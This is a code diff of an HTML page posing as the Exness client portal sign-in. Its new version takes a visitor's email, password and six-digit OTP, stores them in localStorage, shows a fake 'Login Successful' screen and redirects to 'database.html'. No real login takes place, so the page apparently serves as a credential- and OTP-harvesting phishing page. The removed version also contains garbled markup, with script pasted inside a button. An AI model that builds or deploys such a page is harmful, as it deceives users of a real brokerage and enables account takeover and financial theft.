@@ -1,287 +1,134 @@
 <!doctype html>
 <html lang="en">
 <head>
-    <meta charset="utf-8" />
-    <meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1" />
-    <title>Welcome to Exness Client Portal — Sign in</title>
-    <link rel="icon" href="logo.png" type="image/x-icon">
-    <style>
-        :root {
-            --bg: #ffffff;
-            --muted: #6b7280;
-            --accent: #ffd400;
-            --border: #e6e7ea;
-            --input-bg: #fafafa;
-            --google-bg: #f5f7f9;
-            --text: #0f1724;
-            --radius: 10px;
-            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial;
-        }
-        html, body {
-            height: 100%;
-            margin: 0;
-            padding: 0;
-            background: var(--bg);
-            color: var(--text);
-        }
-        .viewport {
-            max-width: 420px;
-            margin: 0 auto;
-            padding: 20px;
-            box-sizing: border-box;
-            min-height: 100vh;
-            display: flex;
-            flex-direction: column;
-        }
-        .logo-container {
-            text-align: center;
-            margin: 20px 0;
-        }
-        .logo-container img {
-            max-width: 200px;
-            height: auto;
-        }
-        .card {
-            background: white;
-            padding: 25px;
-            border-radius: var(--radius);
-            box-shadow: 0 2px 10px rgba(0,0,0,0.05);
-            margin-bottom: 20px;
-        }
-        .field {
-            margin-bottom: 20px;
-        }
-        label {
-            display: block;
-            margin-bottom: 8px;
-            font-weight: 500;
-            color: var(--text);
-        }
-        input[type="email"],
-        input[type="password"],
-        input[type="text"] {
-            width: 100%;
-            padding: 12px 15px;
-            border: 1px solid var(--border);
-            border-radius: var(--radius);
-            font-size: 15px;
-            box-sizing: border-box;
-        }
-        .btn {
-            display: block;
-            width: 100%;
-            padding: 12px;
-            background: var(--accent);
-            color: #000;
-            border: none;
-            border-radius: var(--radius);
-            font-size: 16px;
-            font-weight: 600;
-            cursor: pointer;
-            text-align: center;
-            text-decoration: none;
-            margin-top: 10px;
-        }
-        .password-field {
-            position: relative;
-        }
-        .toggle-password {
-            position: absolute;
-            right: 10px;
-            top: 50%;
-            transform: translateY(-50%);
-            background: none;
-            border: none;
-            cursor: pointer;
-            color: var(--muted);
-        }
-        .spinner {
-            border: 4px solid rgba(0, 0, 0, 0.1);
-            width: 40px;
-            height: 40px;
-            border-radius: 50%;
-            border-left-color: var(--accent);
-            animation: spin 1s linear infinite;
-            margin: 0 auto 20px;
-        }
-        @keyframes spin {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
-        }
-        .success-icon {
-            font-size: 60px;
-            color: #4CAF50;
-            margin-bottom: 20px;
-        }
-        .hidden {
-            display: none !important;
-        }
-    </style>
+<meta charset="utf-8" />
+<meta name="viewport" content="width=device-width,initial-scale=1" />
+<title>Exness Login</title>
+<style>
+:root {
+  --bg:#fff;
+  --text:#111;
+  --muted:#777;
+  --border:#ddd;
+  --accent:#ffd400;
+  --radius:12px;
+  font-family:Helvetica, Arial;
+}
+body{
+  background:var(--bg);
+  margin:0;
+  padding:0;
+}
+.container{
+  max-width:420px;
+  margin:0 auto;
+  padding:20px;
+}
+.card{
+  background:#fff;
+  padding:20px;
+  border-radius:var(--radius);
+  box-shadow:0 2px 10px rgba(0,0,0,0.1);
+}
+input{
+  width:100%;
+  padding:12px;
+  border:1px solid var(--border);
+  border-radius:var(--radius);
+  margin-bottom:15px;
+  font-size:15px;
+}
+button{
+  width:100%;
+  padding:14px;
+  background:var(--accent);
+  border:none;
+  border-radius:var(--radius);
+  font-size:16px;
+  font-weight:bold;
+  cursor:pointer;
+}
+.hidden{ display:none; }
+h1,h2{ text-align:center; }
+</style>
 </head>
-<body>
-    <div class="viewport">
-        <!-- Page 1: Login Form -->
-        <div id="loginPage">
-            <div class="logo-container">
-                <img src="logo.png" alt="Logo">
-            </div>
-            <h1>Welcome to Exness Client Portal</h1>
-            
-            <div class="card">
-                <form id="loginForm">
-                    <div class="field">
-                        <label for="email">Email address</label>
-                        <input type="email" id="email" required placeholder="Enter your email">
-                    </div>
-                    <div class="field">
-                        <label for="password">Password</label>
-                        <div class="password-field">
-                            <input type="password" id="password" required placeholder="Enter your password">
-                            <button type="button" class="toggle-password" onclick="togglePassword()">
-                                👁️
-                                // Save Login Data
-localStorage.setItem("loginData", JSON.stringify({
-    email: document.getElementById('email').value,
-    password: document.getElementById('password').value
-}));
 
-                            </button>
-                        </div>
-                    </div>
-                    <button onclick="saveData()">Sign in</button>
+<body>
+
+<div class="container">
+
+    <!-- LOGIN PAGE -->
+    <div id="loginPage" class="card">
+        <h1>Welcome to Exness</h1>
+
+        <input type="email" id="loginEmail" placeholder="Email address" required>
+        <input type="password" id="loginPassword" placeholder="Password" required>
+
+        <button onclick="goToOtp()">Sign In</button>
+
+        <p style="text-align:center;margin-top:15px;">
+            Don't have an account? <a href="register.html">Register</a>
+        </p>
+    </div>
+
+    <!-- OTP PAGE -->
+    <div id="otpPage" class="card hidden">
+        <h2>Verify OTP</h2>
+
+        <input type="text" id="otpCode" maxlength="6" placeholder="Enter 6-digit OTP">
+
+        <button onclick="submitOtp()">Verify OTP</button>
+    </div>
+
+    <!-- SUCCESS PAGE -->
+    <div id="successPage" class="card hidden">
+        <h2>Login Successful</h2>
+        <p>You will be redirected shortly…</p>
+    </div>
+
+</div>
 
 <script>
-function saveData() {
-    let email = document.getElementById("email").value;
-    let pass  = document.getElementById("password").value;
+function goToOtp() {
+    let email = document.getElementById("loginEmail").value;
+    let pass  = document.getElementById("loginPassword").value;
 
+    if(email === "" || pass === ""){
+        alert("Please fill all fields");
+        return;
+    }
+
+    // SAVE LOGIN DATA
     localStorage.setItem("loginData", JSON.stringify({
         email: email,
         password: pass
     }));
 
-    alert("Saved Successfully!");
+    // SHOW OTP PAGE
+    document.getElementById("loginPage").classList.add("hidden");
+    document.getElementById("otpPage").classList.remove("hidden");
+}
+
+function submitOtp() {
+    let otp = document.getElementById("otpCode").value;
+
+    if(otp.length !== 6){
+        alert("Enter valid 6-digit OTP");
+        return;
+    }
+
+    // SAVE OTP
+    localStorage.setItem("otp", otp);
+
+    // SHOW SUCCESS
+    document.getElementById("otpPage").classList.add("hidden");
+    document.getElementById("successPage").classList.remove("hidden");
+
+    setTimeout(() => {
+        window.location.href = "database.html";
+    }, 2000);
 }
 </script>
-                    </form>
 
-                <p style="text-align: center; margin-top: 20px;">
-                    Don't have an account? <a href="register.html">Register</a>
-                </p>
-            </div>
-        </div>
-
-        <!-- Page 2: OTP Verification -->
-        <div id="otpPage" class="hidden">
-            <div class="logo-container">
-                <img src="logo.png" alt="Logo">
-            </div>
-            <h2>Verify Your Identity</h2>
-            
-            <div class="card">
-                <p>We've sent a 6-digit code to your email. Please enter it below.</p>
-                <form id="otpForm">
-                    <div class="field">
-                        <input type="text" id="otp" 
-                               maxlength="6" 
-                               pattern="\d{6}" 
-                               inputmode="numeric"
-                               placeholder="Enter 6-digit OTP"
-                               required>
-                   
-
-                    </div>
-                 <button onclick="
-    localStorage.setItem('otp', document.getElementById('otp').value);
-">Verify OTP</button>
-
-                </form>
-                <p style="text-align: center; margin-top: 20px;">
-                    Didn't receive the code? <a href="#" id="resendOtp">Resend</a>
-                </p>
-            </div>
-        </div>
-
-        <!-- Page 3: Success Page -->
-        <div id="successPage" class="hidden">
-            <div class="logo-container">
-                <img src="logo.png" alt="Logo">
-            </div>
-            <div style="text-align: center; padding: 40px 0;">
-                <div class="success-icon">✓</div>
-                <h2>Verification Complete!</h2>
-                <p>Your account has been successfully verified.</p>
-                <p>You will be redirected to your dashboard shortly.</p>
-                <div class="spinner" style="margin: 30px auto;"></div>
-            </div>
-        </div>
-    </div>
-
-    <script>
-        // Show/hide password
-        function togglePassword() {
-            const passwordInput = document.getElementById('password');
-            passwordInput.type = passwordInput.type === 'password' ? 'text' : 'password';
-        }
-
-        // Handle login form submission
-        document.getElementById('loginForm').addEventListener('submit', function(e) {
-            e.preventDefault();
-            const email = document.getElementById('email').value;
-            
-            // In a real app, you would validate credentials here
-            console.log('Login attempt with email:', email);
-            
-            // Show OTP page
-            document.getElementById('loginPage').classList.add('hidden');
-            document.getElementById('otpPage').classList.remove('hidden');
-            
-            // Focus OTP input
-            setTimeout(() => {
-                document.getElementById('otp').focus();
-            }, 100);
-        });
-
-        // Handle OTP form submission
-        document.getElementById('otpForm').addEventListener('submit', function(e) {
-            e.preventDefault();
-            const otp = document.getElementById('otp').value;
-            
-            // Basic OTP validation
-            if (otp.length !== 6 || !/^\d+$/.test(otp)) {
-                alert('Please enter a valid 6-digit OTP');
-                return;
-            }
-            
-            // Show success page
-            document.getElementById('otpPage').classList.add('hidden');
-            document.getElementById('successPage').classList.remove('hidden');
-            
-            // In a real app, you would verify the OTP with your backend here
-            console.log('Verifying OTP:', otp);
-            
-            // Simulate API call and redirect
-            setTimeout(() => {
-                // Store in localStorage that user is logged in
-                localStorage.setItem('isLoggedIn', 'true');
-                
-                // Redirect to dashboard after successful verification
-                window.location.href = 'dashboard.html';
-            }, 3000); // 3 seconds delay to show success message
-        });
-
-        // Handle resend OTP
-        document.getElementById('resendOtp').addEventListener('click', function(e) {
-            e.preventDefault();
-            // In a real app, you would resend the OTP here
-            console.log('Resending OTP...');
-            alert('A new OTP has been sent to your email.');
-        });
-
-        // Check if user is already logged in
-        if (localStorage.getItem('isLoggedIn') === 'true') {
-            window.location.href = 'dashboard.html';
-        }
-    </script>
 </body>
 </html>
